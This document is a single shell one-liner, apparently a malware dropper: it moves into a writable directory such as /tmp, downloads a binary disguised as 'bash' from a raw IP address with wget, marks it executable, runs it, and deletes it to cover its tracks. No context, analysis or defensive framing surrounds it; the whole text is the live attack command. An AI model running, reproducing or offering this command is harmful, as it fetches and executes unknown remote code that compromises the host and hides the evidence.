cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.77.227.254/bash; chmod +x bash; ./bash; rm -rf bash
